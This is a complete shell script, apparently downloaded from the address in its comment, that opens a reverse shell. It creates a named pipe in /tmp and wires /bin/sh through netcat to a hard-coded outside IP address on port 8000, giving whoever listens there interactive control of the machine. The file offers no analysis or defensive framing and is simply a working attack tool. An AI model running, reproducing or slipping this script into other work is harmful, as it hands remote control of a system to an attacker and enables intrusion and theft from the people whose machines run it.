#!/bin/sh
# http://163.44.164.72/download/reverse.sh

a=$(date +%s);
backpipe="backpipe""$a";

mknod /tmp/$backpipe p;
/bin/sh 0</tmp/$backpipe | nc 163.44.164.72 8000 1>/tmp/$backpipe;
